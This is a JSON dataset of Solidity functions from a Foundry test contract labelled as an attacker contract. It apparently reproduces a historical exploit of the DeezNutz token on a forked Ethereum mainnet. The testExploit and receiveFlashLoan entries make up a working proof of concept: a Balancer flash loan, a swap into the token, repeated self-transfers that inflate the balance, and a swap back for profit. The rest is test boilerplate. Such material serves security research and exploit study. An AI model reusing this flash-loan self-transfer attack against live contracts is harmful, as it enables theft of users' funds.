[
  {
    "contract/interface": "DeezNutzTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "DeezNutzTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DeezNutzTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DeezNutzTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DeezNutzTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "DeezNutzTest",
    "source_type": "attacker_contract",
    "function_name": "receiveFlashLoan",
    "original_code": "    function receiveFlashLoan(address[] memory, uint256[] memory, uint256[] memory, bytes memory) external {\n        emit log_named_uint(\"after borrow, WETH amount\", WETH.balanceOf(address(this)) / 1 ether);\n\n        WETH.approve(address(router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(WETH);\n        path[1] = address(DeezNutz);\n\n        router.swapExactTokensForTokens(WETH.balanceOf(address(this)), 0, path, address(this), type(uint256).max);\n        emit log_named_uint(\"after swap, DeezNutz amount\", DeezNutz.balanceOf(address(this)) / 1 ether);\n\n        for (uint256 x = 0; x < 5; x++) {\n            DeezNutz.transfer(address(this), DeezNutz.balanceOf(address(this)));\n            emit log_named_uint(\"after self transfer, DeezNutz amount\", DeezNutz.balanceOf(address(this)) / 1 ether);\n        }\n\n        DeezNutz.approve(address(router), type(uint256).max);\n        path[0] = address(DeezNutz);\n        path[1] = address(WETH);\n\n        DeezNutz.transfer(pair, DeezNutz.balanceOf(address(this)) / 20); // to pass k value test.\n        router.swapExactTokensForTokens(DeezNutz.balanceOf(address(this)), 0, path, address(this), type(uint256).max);\n        emit log_named_uint(\"after swap back, WETH amount\", WETH.balanceOf(address(this)) / 1 ether);\n\n        WETH.transfer(msg.sender, 2001 ether);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "DeezNutzTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 19_277_802);\n        emit log_named_uint(\"Before attack, WETH amount\", WETH.balanceOf(address(this)) / 1 ether);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DeezNutzTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DeezNutzTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DeezNutzTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DeezNutzTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "DeezNutzTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DeezNutzTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DeezNutzTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        address[] memory tokens = new address[](1);\n        tokens[0] = address(WETH);\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = 2000 ether;\n\n        emit log_string(\"------------------- flashloan from balancer ---------\");\n        vault.flashLoan(address(this), tokens, amounts, \"\");\n        emit log_string(\"------------------- flashloan finish ----------------\");\n\n        emit log_named_uint(\"after attack, WETH amount\", WETH.balanceOf(address(this)) / 1 ether);\n    }\n\n",
    "description": ""
  }
]